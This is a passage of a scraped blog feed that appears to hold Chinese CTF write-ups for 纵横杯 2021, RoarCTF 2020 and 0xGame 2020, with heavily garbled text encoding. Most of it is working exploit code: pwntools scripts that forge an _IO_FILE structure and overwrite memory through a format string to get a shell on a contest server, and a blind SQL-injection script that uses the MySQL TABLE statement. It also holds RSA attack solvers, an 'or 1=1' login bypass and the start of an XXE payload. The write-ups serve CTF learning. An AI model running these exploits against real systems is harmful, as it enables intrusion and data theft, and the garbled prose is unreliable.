libc.sym[\u0026#39;_IO_list_all\u0026#39;] IO_str_jumps = libc_base + 0x3C37A0 fake_IO_FILE = p64(0) + p64(0x61) fake_IO_FILE += p64(0) + p64(IO_list_all - 0x10) fake_IO_FILE += p64(0) + p64(1) fake_IO_FILE += p64(0) + p64(libc_base + libc.search(\u0026#39;/bin/sh\u0026#39;).next()) fake_IO_FILE = fake_IO_FILE.ljust(0xD8,\u0026#39;\\x00\u0026#39;) fake_IO_FILE += p64(IO_str_jumps - 8) fake_IO_FILE += p64(0) + p64(libc_base + libc.sym[\u0026#39;system\u0026#39;]) new(3,0x200,\u0026#39;\\x00\u0026#39;*0x200 + fake_IO_FILE) menu(1) p.sendline(\u0026#39;4\u0026#39;) p.sendline(str(0x200)) p.interactive() shell from pwn import* context.log_level = \u0026#39;DEBUG\u0026#39; p = process(\u0026#39;./main\u0026#39;) p = remote(\u0026#39;182.92.203.154\u0026#39;,35264) libc =ELF(\u0026#39;./libc-2.23.so\u0026#39;) p.sendline(\u0026#39;fg %12$p\u0026#39;) p.recvuntil(\u0026#39;0x\u0026#39;) proc_base = int(p.recv(12),16) - 0x203169 log.info(\u0026#39;Proc:\\t\u0026#39; + hex(proc_base)) payload = \u0026#39;fg %174$s\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030B8) p.sendline(payload) libc_base = u64(p.recvuntil(\u0026#39;\\x7F\u0026#39;)[-6:].ljust(8,\u0026#39;\\x00\u0026#39;)) - libc.sym[\u0026#39;getopt\u0026#39;] log.info(\u0026#39;LIBC:\\t\u0026#39; + hex(libc_base)) payload = \u0026#39;fg %\u0026#39; + str((libc_base + 0x45226)\u0026amp;0xFF) + \u0026#39;c%174$hhn\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030C8) p.sendline(payload ) sleep(0.2) payload = \u0026#39;fg %\u0026#39; + str(((libc_base + 0x45226)\u0026gt;\u0026gt;8)\u0026amp;0xFF) + \u0026#39;c%174$hhn\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030C8 + 1) p.sendline(payload ) sleep(0.2) payload = \u0026#39;fg %\u0026#39; + str(((libc_base + 0x45226)\u0026gt;\u0026gt;16)\u0026amp;0xFF) + \u0026#39;c%174$hhn\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030C8 + 2) p.sendline(payload) sleep(0.2) payload = \u0026#39;fg %\u0026#39; + str(((libc_base + 0x45226)\u0026gt;\u0026gt;24)\u0026amp;0xFF) + \u0026#39;c%174$hhn\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030C8 + 3) p.sendline(payload) sleep(0.2) payload = \u0026#39;fg %\u0026#39; + str(((libc_base + 0x45226)\u0026gt;\u0026gt;32)\u0026amp;0xFF) + \u0026#39;c%174$hhn\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030C8 + 4) p.sendline(payload) sleep(0.2) payload = \u0026#39;fg %\u0026#39; + str(((libc_base + 0x45226)\u0026gt;\u0026gt;40)\u0026amp;0xFF) + \u0026#39;c%174$hhn\u0026#39; payload = payload.ljust(0x10,\u0026#39;U\u0026#39;) payload += p64(proc_base + 0x2030C8 + 5) p.sendline(payload) p.sendline(\u0026#39;quit\u0026#39;) p.interactive() Crypto common $$ W_i : e_i d_i g âˆ’ k_i N = g âˆ’ k_i s \\ G_{i,j} : k_i d_j e_j âˆ’ k_j d_i e_i = k_i âˆ’ k_j $$\nåˆ™ $k_1 k_2 = k_1 k_2, k_2 W_1, g G_{1,2}, W_1 W_2$ è½¬åŒ–æˆçŸ©é˜µå½¢å¼, æœ‰ $x B = v$, å…¶ä¸­\n$$ x = (k_1 k_2, k_2 d_1 g, k_1 d_2 g, d_1 d_2 g^2 )\\\n$$\n$$ B = \\begin{bmatrix} 1 \u0026amp; âˆ’N \u0026amp; 0 \u0026amp; N^2 \\\n\u0026amp; e_1 \u0026amp; âˆ’e_1 \u0026amp; âˆ’e_1 N \\\n\u0026amp; \u0026amp; e_2 \u0026amp; âˆ’e_2 N \\\n\u0026amp; \u0026amp; \u0026amp; e_1 e_2 \\end{bmatrix} \\\n$$\n$$ v = ( k_1 k_2, k_2 (g âˆ’ k_1 s), g(k_1 âˆ’ k_2 ), (g âˆ’ k_1 s)(g âˆ’ k_2 s) ) $$\nä»¤ $D = diag(N, N^{1/2}, N^{1+Î´}, 1)$, ä½¿å…¶æ»¡è¶³ Minkowskiâ€™s bound, æœ‰ $||vD|| \u0026lt; vol(L) = |det(B) det(D)|$â€‹ å³ $N^{2(1/2+Î´)} \u0026lt; 2N^{(13/2+Î´)/4}$, $\\delta \u0026lt; 5/14 - \\epsilon$.\nåˆ©ç”¨ LLL æ±‚å‡ºæœ€çŸ­å‘é‡ $vD$, è¿›è€Œæ±‚å‡º $x$, æ ¹æ® Wienerâ€™s attack,\n$\\phi(N) = g(ed-1)/k = floor(edg/k)$\næœ‰äº† $\\phi(N)$ å³å¯æ„é€ ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹åˆ†è§£ $N$.\nç”±äºä¸çŸ¥é“ d çš„ bit_lengthï¼Œæ‰€ä»¥åœ¨ d çš„èŒƒå›´æ•°é‡çº§å†…è¿›è¡Œæšä¸¾.\nfrom Crypto.Util.number import * e1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581 e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563 n = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253 c1 = 146909924775777545824125517620214432622747621336824079421034301103629039466278879970055167808022739191107404040533998083148999374814673815811700861183666902780211467579162513402284885468509497173923312288517762537710685279334418218434239027287721913878857488858370213558290629714369437407772388155553108200163 c2 = 115438050647632891775942222426836609647233560975189459023903698975771968885651962350811446729447308791250106017608721971839646737217571069312136094548245526295433224742092456687558361490026944153234227613733080447542300903055383052411559869065719789087584331775863089548946206039897996352433427474819495059230 m1 = int(n^(1/2)) def autoflag(t): m2 = int(n^(1+t)) B2 = matrix([[1,-n, 0, n**2], [0,e1,-e1,-e1*n], [0, 0, e2,-e2*n], [0, 0, 0,e1*e2]]) D2 = matrix([[n, 0, 0,0], [0,m1, 0,0], [0, 0,m2,0], [0, 0, 0,1]]) M = B2*D2 # k1k2, k2d1, k1d2, d1d2 for vec in M.LLL()[:1]: b1,b2,b3,b4 = vec x2 = Matrix([[b1,b2,b3,b4]])*M.inverse() a,b,c,d = x2[0] d1 = GCD(b,d) d2 = GCD(c,d) if d1 and d2: print(long_to_bytes(pow(c1,d1,n))+long_to_bytes(pow(c2,d2,n))) exit(0) t=0.3334 while t\u0026lt;0.3570: t+=0.0001 autoflag(t) digits_missing åˆ†æ®µè§£flagï¼Œæœ€å¼€å§‹å¯ä»¥ç›´æ¥è§£ä¼ åˆ°leakå‡½æ•°é‡Œçš„cï¼Œé€šè¿‡å·²çŸ¥çš„p,qï¼Œç›´æ¥è§£c4ï¼Œå¾—åˆ°flag[1] + flag[2].\nfrom Crypto.Util.number import * c4 = 91995782648980010847427739993217486026162499349605746023085733950130331287970901582164575965127425637201059093005775243323253033284087100922267082650658959030428900175654644688492357085409246823740850913373272701143044152106592667697815257823931523933665000651956390275184280406451020398039989430172569966888 p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 flag12 = long_to_bytes(pow(c4, inverse(0x10001, (p-1)*(q-1)), p*q)) print(flag12) # 1b1e4c40 ç„¶åå¯ä»¥åˆ©ç”¨CRTæ±‚å‡ºdï¼Œå¾—åˆ°paddingï¼Œç”±äºä¸çŸ¥é“eï¼Œæ‰€ä»¥éœ€è¦æšä¸¾ä¸€ä¸‹ã€‚\nfrom functools import reduce from gmpy2 import * from Crypto.Util.number import * p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 dp = 4634673191749715344785371257538762101853031598311319863390489299958637062425141842768415934848075692534267896154614889702109236564561535721415087927569509 dq = 2784697141013150647927285038744181880232562395909713238360955579919897480173610712938239225733208967421091494647565583041208257260929211079467472399900897 c1 = 18651280944551604311574513905924240808170858244682968806319904706985057531598471703952601755416438724112982474074553590239198586111314171935361177438127669603910558881488636283078776442128635151084339480382293790405590179460228017768072311976510633046745233628899455474429389344003169695798357039738211025666 def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def crt(a, m): m1, a1, lcm = m[0], a[0], m[0] for i in range(1, len(m)): m2 = m[i] c = a[i]-a1 g, k1, _ = egcd(m1, m2) lcm = lcm*m[i]//GCD(lcm, m[i]) if c % g: print(\u0026#39;No Answer!\u0026#39;) return x0 = c//g*k1 t = m2//g x0 = (x0 % t + t) % t a1 += m1*x0 m1 = m2//g*m1 return a1 a, m = [dp, dq], [p-1, q-1] ans = crt(a, m) LCM = reduce(lambda x, y: x*y//gcd(x, y), m) P = reduce(lambda x, y: x*y, m) i = 0 x = ans+i*LCM while x \u0026lt; P: assert x%(p-1)==dp and x%(q-1)==dq b = pow(c1, x, p*q) e = inverse(x,(p-1)*(q-1)) if b.bit_length()==512 and e.bit_length()==32: print(f\u0026#34;b = {b}\u0026#34;) break i += 1 x = ans+i*LCM # b = 8998739874124476330077050284905438547791211705007347879192939614678547567964644612148886036506107930061008040551064553043959063715512574971543459965428364 bsgs ä¸€ä¸‹å¾—åˆ° e1+e2ï¼ˆä½¿ç”¨SageMathï¼‰ï¼š\nc2 = 5482916971077907100465900758386122395988093179254480170511691938212094686909346076331158369021240925800603504683768019354372182250751332596677686598659819347466337649573401050759675695503404236960750776674833294023038703715840843231408879195866584742586386333373862336287408841247917195883597624403390910372 p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 b = 8998739874124476330077050284905438547791211705007347879192939614678547567964644612148886036506107930061008040551064553043959063715512574971543459965428364 m1, m2 = b \u0026gt;\u0026gt; 256, b \u0026amp; 2 ** 256 - 1 F = IntegerModRing(p*q) mm = F(m1+m2) c2 = F(c2) bsgs(mm, c2, (0, 2**32)) # 1751345818 from Crypto.Util.number import * e12 = 1751345818 c3 = 74961624700570825661425074699932176609321469056449513783085829938826707337287502198895054962001192345105970228367025392103044122840249185367359738330285315139075044769056261215439422786423423520242882616599069262320657892736490573199953747616316977906614094081725739377860475149681397270351494502879810040119 p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 TABLE = b\u0026#34;01234567890abcdef\u0026#34; for i in range(16): for j in range(16): for k in range(16): for o in range(16): e1 = TABLE[i]*2**24 + TABLE[j]*2**16 + TABLE[k]*2**8 + TABLE[o] e2 = e12 - e1 a = (e1\u0026lt;\u0026lt;32) + e2 if pow(a, a, p*q) == c3: print(long_to_bytes(a)) # b\u0026#39;321e5195\u0026#39; æœ€åä¸€éƒ¨åˆ†flag3ï¼Œç”¨coppersmithæ¥è§£ã€‚\nmbar = bytes_to_long(b\u0026#34;321e5195\u0026#34; + long_to_bytes(padding) + b\u0026#34;1b1e4c40\u0026#34;) n = 99533148715508609137315732805340516238122605337971905073134049106535471150400953730776337851964290567462702510396193784084088446908685021259972049637120028927772077104891416698410847060838652281541457498771809838214954281245418160294140103403240809785976984535856950679868772244695570256951863999317571672437 c = 34338582171207379862033525927782528983529583622746250191048534516512185865146804370249601090807953801674089517476781590729012862579342009960254301681032365519483896873518539964443668111491961935441741311240417442342928596805632431072554504001292544711291709844962036644053777982072444079745282278911191432141 P.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = (mbar*2^128 + x)^5 - c roots = f.small_roots(epsilon=1/25) m = mbar*2^128 + roots[0] m_str = long_to_bytes(m) flags = [m_str[:8], m_str[-24:-20], m_str[-20:-16], m_str[-16:-12], m_str[-12:]] flag = b\u0026#34;flag{\u0026#34; + b\u0026#34;-\u0026#34;.join(flags) + b\u0026#34;}\u0026#34; print(flag) flag{321e5195-1b1e-4c40-816b-1dab7e595f49}\nRe friednly re sub413590 sub4120c0 sub412040 sub411db0 sub41123fæ˜¯å…³é”®å‡½æ•° mainå‡½æ•°ä¸­å…ˆnopæ‰å‡ ä¸ªæŒ‡ä»¤ï¼Œèƒ½å¤Ÿè¾“å…¥ ç„¶åæ‰‹åŠ¨hook messageboxw,å› ä¸ºmainå‡½æ•°å‰å°è¯•ç¨‹åºè‡ªå·±å¤±è´¥äº†ï¼Œhookæˆå‡½æ•°sub411370, ç„¶åæ³¨å†Œäº†å¼‚å¸¸ï¼Œå¼‚å¸¸æœ‰æ³¨å†Œäº†å¼‚å¸¸ï¼Œç»è¿‡æ•´ç†æ˜ç™½ï¼ŒæŒ‰é¡ºåºæ•´ç† sub4120c0 sm4å¯†é’¥åˆå§‹åŒ– ç„¶åsub412040 sm4å¯¹æˆ‘ä»¬è¾“å…¥åŠ å¯† sub411db0 å¯¹æ¯”çš„ç­”æ¡ˆç§»ä½ å¯¹sm4åŠ å¯†åçš„ç»“æœè¿›è¡Œæ”¹base64åŠ å¯† sub_412450æœ€åå¯¹æ¯” ä½†æ˜¯æœ€åçš„æ„Ÿå¹å·ä¸@ä¸å¯¹åº”ï¼Œæƒ³äº†è¿˜ä¹… åé¢ç™¾åº¦åˆ°æ˜¯å®‰æ´µæ¯çš„é¢˜ç›®é­”æ”¹ ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œçœ‹å¥½åƒæ˜¯ä½œè€…æ²¡å†™å¥½äº† åº”ç”¨å®‰æ´µæ¯çš„è„šæœ¬ æ”¹ä¸€ä¸‹å°±è¡Œ æ‰¾åˆ°çš„å®‰è¯¢æ¯çš„è„šæœ¬æ¥æº https://blog.csdn.net/qq_39542714/article/details/106834822\nfrom pysm4 import decrypt,encrypt from base64 import b64decode Str = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/\u0026#34; Str_ = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34; Str1 = \u0026#39;\u0026#39; for i in Str: Str1 += Str[(Str.find(i)+32) % len(Str)] print (Str1) enc = \u0026#34;2NI5JKCBI5Hyva+8AZa3mq!!\u0026#34; dec1 = \u0026#39;\u0026#39; for i in range(len(enc)): if enc[i] == \u0026#39;!\u0026#39;: dec1 += \u0026#39;=\u0026#39; else: dec1 += Str_[Str1.find(enc[i])] print (dec1) dec2 = b64decode(dec1) print (dec2) import codecs encode_hex = codecs.getencoder(\u0026#34;hex_codec\u0026#34;) dec3 = int(encode_hex(dec2)[0],16) print (dec3) key = \u0026#34;Thisisinsteresth\u0026#34; key = int(encode_hex(key)[0],16) print (key) decode_hex = codecs.getdecoder(\u0026#34;hex_codec\u0026#34;) dec4 = decrypt(dec3, key) dec4 = str(hex(dec4)[2:-1]) print (decode_hex(dec4)[0]) ","date":"2021-01-04T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/","title":"çºµæ¨ªæ¯ Writeup by X1cT34m"},{"content":"ezsql è€ƒç‚¹ï¼šå¸ƒå°”ç›²æ³¨ï¼ŒMySQL_8.0.19æ–°ç‰¹æ€§tableè¯­å¥ï¼Œæ— åˆ—åç›²æ³¨\næˆªå›¾æˆªæ²¡æœ‰äº†ï¼Œå¿˜äº†ï¼Œç®€å•è¯´ä¸‹æ€è·¯ï¼š\nä¼ ç»Ÿè‰ºèƒ½sqliï¼Œæœ¬æ¥æ˜¯ä¸€ä¸ªå¸¸è§„çš„å¸ƒå°”ç›²æ³¨ï¼Œä¸è¿‡ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå¤§å°å†™banæ‰äº†selectï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•è·¨è¡¨æŸ¥è¯¢ï¼Œåªèƒ½åŒè¡¨æŸ¥è¯¢æˆ–è€…æŸ¥åº“åï¼š\nadmin'/**/and/**/ascii(substr(database(),1,1))\u0026gt;32#\r//åº“åctf\radmin'/**/and/**/ascii(substr(password,1,1))\u0026gt;32#\r//å¯†ç b4bc4c343ed120df3bff56d586e6d617\ræœ¬æ¥æµ‹å‡ºæ¥æœ‰å †å ï¼Œä½†æ˜¯ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå †å ä¹Ÿèƒæ­»è…¹ä¸­ã€‚\næ³¨å‡ºæ¥å¯†ç md5(gml666)==b4bc4c343ed120df3bff56d586e6d617ä¹‹åï¼Œç™»é™†ï¼Œæç¤ºno flagï¼› ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œè¿™åˆ°é¢˜å¦‚æœMySQLç‰ˆæœ¬ä¸æ˜¯\u0026gt;=8.0.19çš„è¯å°±æ˜¯æ²¡æœ‰æ–¹æ³•åšçš„ï¼›\næˆ‘ä»¬èƒ½å¤Ÿåœ¨å®˜æ–¹æ–‡æ¡£æ‰¾åˆ°ä»¥ä¸‹èµ„æ–™\n The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:\nTABLE t; SELECT * FROM t; You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)\n æœ¬åœ°Windowsèµ·ä¸€ä¸ªMySQL_8.0.22çš„ç¯å¢ƒè°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¹‹å‰æ–°æ˜¥æˆ˜ç–«çš„ezsqlçš„å§¿åŠ¿å¯ä»¥ç”¨ï¼Œå½“æ—¶è¿˜æŠ„äº†é¢–å¥‡å¸ˆå‚…çš„åšå®¢ã€‚\n æ ¸å¿ƒpayloadï¼š(select \u0026lsquo;admin\u0026rsquo;,\u0026lsquo;admin\u0026rsquo;)\u0026gt;(select * from users limit 1)\n  å‡è®¾flagä¸ºflag{bbbbb}ï¼Œå¯¹äºpayloadè¿™ä¸ªä¸¤ä¸ªselectæŸ¥è¯¢çš„æ¯”è¾ƒï¼Œæ˜¯æŒ‰ä½æ¯”è¾ƒçš„ï¼Œå³å…ˆæ¯”ç¬¬ä¸€ä½ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¯”ç¬¬äºŒä½ï¼Œä»¥æ­¤ç±»æ¨ï¼›åœ¨æŸä¸€ä½ä¸Šï¼Œå¦‚æœå‰è€…çš„ASCIIå¤§ï¼Œä¸ç®¡æ€»é•¿åº¦å¦‚ä½•ï¼ŒASCIIå¤§çš„åˆ™å¤§ï¼Œè¿™ä¸ªä¸éš¾æ‡‚ï¼Œå’Œcè¯­è¨€çš„strcmp()å‡½æ•°åŸç†ä¸€æ ·ï¼Œä¸¾å‡ ä¸ªä¾‹å­ï¼š\n glag \u0026gt; flag{bbbbb}   alag{zzzzzzzzzzz} \u0026lt; flag{bbbbb} a \u0026lt; flag{bbbbb} z \u0026gt; flag{bbbbb}  åº“åå·²çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯è¡¨åï¼Œæ ¹æ®å†™çš„å¾ˆé»‘çš„wafï¼Œæˆ‘ä»¬å…¶å®åªæœ‰ä¸€æ¡è·¯ï¼šinformation_schema.tablesï¼Œè¿™å¼ è¡¨ç»“æ„å¤§æ¦‚æ˜¯è¿™æ ·ï¼š ç¬¬ä¸€åˆ—TABLE_CATALOGåŸºæœ¬éƒ½æ˜¯defï¼Œå°‘æ•°æ˜¯NULLï¼Œç¬¬äºŒåˆ—æ˜¯åº“åï¼Œç¬¬ä¸‰åˆ—æ˜¯è¡¨åï¼Œæˆ‘ä»¬å°±åªéœ€è¦çŸ¥é“è¿™äº›ï¼Œå¦å¤–çš„å¤ªå¤šäº†ä¸æ–¹ä¾¿è´´ã€‚\npayloadå¤§æ¦‚é•¿è¿™æ ·ï¼š\nadmin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)\u0026lt;(table/**/information_schema.tables/**/limit/**/0,1)#\r//è¿”å›password error!\radmin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)\u0026gt;(table/**/information_schema.tables/**/limit/**/0,1)#\r//è¿”å›,username error!\ræ¥ä¸‹æ¥æ˜¯expï¼š\n#python3 import requests url = \u0026#39;http://139.129.98.9:30003/login.php\u0026#39; def trans(flag): res = \u0026#39;\u0026#39; for i in flag: res += hex(ord(i)) res = \u0026#39;0x\u0026#39; + res.replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) return res flag = \u0026#39;flag{6a55e234-1ed0-455c-bbf3-6df6ddce\u0026#39; # flagåªèƒ½è·‘åˆ°è¿™é‡Œï¼Œåé¢çš„ä¸€ä½ä»»æ„å­—æ¯çœŸä»»æ„éå­—æ¯å‡ for i in range(1,500): #è¿™å¾ªç¯ä¸€å®šè¦å¤§ ä¸ç„¶flagé•¿çš„è¯è·‘ä¸å®Œ hexchar = \u0026#39;\u0026#39; for char in range(32, 126): hexchar = trans(flag+ chr(char)) # payload = \u0026#34;admin\u0026#39;/**/and/**/ROW(\u0026#39;def\u0026#39;,\u0026#39;ctf\u0026#39;,{},\u0026#39;A\u0026#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)\u0026#34; \\ # \u0026#34;\u0026gt;(table/**/information_schema.tables/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/1,1)#\u0026#34;.format(hexchar) # #è¡¨åadminå’Œf11114g # payload = \u0026#34;admin\u0026#39;/**/and/**/ROW(\u0026#39;def\u0026#39;,\u0026#39;ctf\u0026#39;,\u0026#39;admin\u0026#39;,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)\u0026#34; \\ # \u0026#34;\u0026gt;(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/2,1)#\u0026#34;.format(hexchar) # #adminï¼šid,USERNAME,PASSWORD.....æ‰“åäº† # payload = \u0026#34;admin\u0026#39;/**/and/**/ROW(\u0026#39;def\u0026#39;,\u0026#39;ctf\u0026#39;,\u0026#39;f11114g\u0026#39;,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)\u0026#34; \\ # \u0026#34;\u0026gt;(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/6,1)#\u0026#34;.format(hexchar) # #f11114gï¼šF1LLLAGGGåªæœ‰ä¸€åˆ— payload = \u0026#34;admin\u0026#39;/**/and/**/{}\u0026#34; \\ \u0026#34;\u0026gt;(table/**/ctf.f11114g/**/limit/**/1,1)#\u0026#34;.format(hexchar) #è¿™é‡Œæœ¬æ¥ä¸éœ€è¦åˆ—åçš„ï¼Œæ³¨åˆ—åæ˜¯ä¸ºäº†ææ¸…æ¥šæœ‰å‡ åˆ— data = { \u0026#39;username\u0026#39;: payload, \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; } proxies = { \u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, } try: r = requests.post(url=url, data=data, proxies=proxies, timeout=2) except: pass print(char, r.text, data[\u0026#39;username\u0026#39;]) if \u0026#39;password error!\u0026#34;\u0026#39; in r.text: flag += chr(char-1) print(flag) break è¯´æ˜ä¸€ä¸‹ï¼Œè¿™ä¸ªexpæœ‰ç‚¹é—®é¢˜ï¼Œæ¯”å¦‚flagä¸­çš„-ä¼šè·‘å‡ºæ¥å•å¼•å·ï¼Œé‡åˆ°çš„æ—¶å€™æ‰‹åŠ¨æ¢ä¸€ä¸‹å°±å¥½ï¼Œç„¶åå°±æ˜¯è·‘åˆ°æœ€åå››ä½çš„æ—¶å€™ä¼šæ–­æ‰ï¼Œåé¢çš„ç„å­¦è·‘ä¸å‡ºæ¥ã€‚ èµ›åå’Œå¸ˆå‚…äº¤æµè¯´å…¶å®flagå¯ä»¥ç›´æ¥ç”¨ascii(substr(flag,1,1))\u0026gt;1çš„æ–¹å¼æ¥åšï¼Œå› ä¸ºf11114gè¡¨é‡Œé¢åªæœ‰ä¸€ä¸ªå­—æ®µã€‚\n","date":"2020-12-07T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/roarctf-2020/","title":"RoarCTF 2020"},{"content":"å­¦æ ¡æœ‰å²ä»¥æ¥ç¬¬ä¸€æ¬¡è¿™ä¹ˆç®€å•çš„æ–°ç”Ÿèµ›ï¼Œæˆ‘æ‰¿æ‹…å¹³å°çš„è¿ç»´å’Œwebå‡ºé¢˜ã€‚\nç¬¬ä¸€æ¬¡å‡ºè¿™ä¹ˆå¤šé¢˜ï¼Œè™½ç„¶é¢˜ç›®éš¾åº¦éƒ½ä¸å¤§ï¼Œä¸è¿‡æŠ˜è…¾å’Œæå¹³å°ç¯å¢ƒè¿˜æ˜¯èŠ±äº†ä¸å°‘ç²¾åŠ›ï¼Œç›®çš„åœ¨äºä¸‰ç‚¹ï¼š\n å¸Œæœ›CTFèƒ½åœ¨å­¦æ ¡æ›´æ™®åŠ å¸Œæœ›èƒ½æ‰¾åˆ°æœ‰å…´è¶£å’Œæœ‰æ¯…åŠ›çš„å­¦å¼Ÿå­¦å¦¹ é¢˜ç›®å¾ˆå¤šéƒ½æ˜¯æ¥è‡ªå…¥é—¨æ–‡æ¡£çš„çŸ¥è¯†ç‚¹ï¼Œçœ‹è¿‡çš„ä¸€å®šå¾ˆå®¹æ˜“åšå‡ºæ¥ï¼Œå¸Œæœ›æ–°åŒå­¦èƒ½è®¤çœŸçœ‹èµ„æ–™   é¢˜ç›®å¼€æºåœ°å€ï¼šhttps://github.com/Anthem-whisper/0xGame2020\næ‰€æœ‰é¢˜ç›®ç¯å¢ƒï¼šhttps://shimo.im/docs/8hkRHdRDdWyKycyK\nå› ä¸ºæ˜¯è‡ªè´¹è¿è¥ï¼Œè¿˜è¯·å¸ˆå‚…ä»¬ä¸è¦æ¶æ„ç ´åç¯å¢ƒ\nç¬¬ä¸€å‘¨ é¢˜ç›®éƒ½æ˜¯æœ€ç®€å•çš„å…¥é—¨é¢˜ç›®ï¼Œä¹Ÿä¸æ¶‰åŠwebæ¼æ´ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚ä¸»è¦è€ƒå¯ŸåŒå­¦ä»¬é…ç½®ç¯å¢ƒçš„åŠ¨æ‰‹èƒ½åŠ›ã€‚\nç¬¬äºŒå‘¨ å‡ºäº†ä¸€é“å¾ˆç®€å•çš„SQLæ³¨å…¥ï¼Œ\næ ¸å¿ƒæ˜¯è¦çŒœæµ‹ç™»å½•æ—¶æ‰€æ‹¼æ¥çš„sqlè¯­å¥ï¼š\n$sql = \u0026quot;select username from user where username='\u0026quot;. $username .\u0026quot;' and password='\u0026quot;. $password .\u0026quot;';\u0026quot;;\ræ²¡æœ‰ä»»ä½•wafï¼Œåœ¨ç”¨æˆ·åå¤„è¾“å…¥admin' or 1=1#æå®šï¼Œç”±äº#ç¬¦å·æŠŠåé¢çš„è¯­å¥æ³¨è§†æ‰äº†ï¼Œå®é™…ä¸Šsqlè¯­å¥å®é™…ä¸Šå˜æˆäº†ï¼š\nselect username from user where username='admin' or 1=1\r1=1æ˜¯æ°¸è¿œæˆç«‹çš„ï¼Œæ‰€ä»¥å¿…ç„¶èƒ½è¿”å›å¤§äºä¸€è¡Œçš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ mysql_num_rows($res)\u0026gt;0ï¼Œå°±å¯ä»¥è·å¾—flag\nç¬¬ä¸‰å‘¨ ä¸€é“XXEï¼Œä¸€é“SQLå¸ƒå°”ç›²æ³¨\ninject_me XXEæ˜¯å»å¹´NCTF2019çš„åŸé¢˜ï¼Œæˆ‘åœ¨webå…¥é—¨docé‡Œé¢å†™è¿‡ï¼Œå¹¶ä¸”é¢˜ç›®åœ°å€å’Œæºç æˆ‘éƒ½ç»™äº†ã€‚\nåœ¨ç»™äº†hintçš„æƒ…å†µä¸‹è¿™ä¹ˆå°‘çš„è§£è¿˜æ˜¯å‡ºä¹æˆ‘çš„æ„æ–™\nç”±HTTPå“åº”é‡Œé¢è¿”å›çš„æ ‡ç­¾ä»¥åŠContent-Typeæ˜¯xmlæ ¼å¼å¯ä»¥å¾ˆè½»æ˜“çš„ç™¾åº¦åˆ°XXEè¿™ç§æ”»å‡»æ‰‹æ®µ\nXXEå­¦ä¹ ï¼šhttps://xz.aliyun.com/t/3357\nå‘Šè¯‰äº†/flagï¼Œé‚£ä¹ˆéšæ‰‹ä¸€ä¸ªpayloadå°±å‡ºæ¥äº†ï¼š\n\u0026lt;?xml 